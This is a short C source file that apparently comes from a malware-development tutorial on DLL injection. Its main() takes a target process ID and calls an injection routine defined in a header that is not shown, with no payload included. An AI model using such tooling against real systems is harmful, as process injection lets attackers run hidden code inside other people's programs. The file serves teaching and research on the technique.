/*
----------------------------------------------------------------------------------
@culprit: crow
@website: https://www.crow.rip/crows-nest/mal/dev/inject/dll-injection
@credits: https://www.crow.rip/crows-nest/mal/dev/inject/dll-injection#references
@youtube: https://youtu.be/A6EKDAKBXPs
----------------------------------------------------------------------------------
*/

#include "injection.h"

int main(int argc, char* argv[]) {

    PrintBanner();

    if (argc < 2) {
        WARN("usage: \"%s\" [PID]", argv[0]);
        return EXIT_FAILURE;
    }
    printf("%d", sizeof(DLL));
    if (!DLLInjection(DLL, atoi(argv[1]), sizeof(DLL))) {
        WARN("DLL injection failed, exiting...");
        return EXIT_FAILURE;
    }

    OKAY("DLL injection was successful! exiting...");
    return EXIT_SUCCESS;

}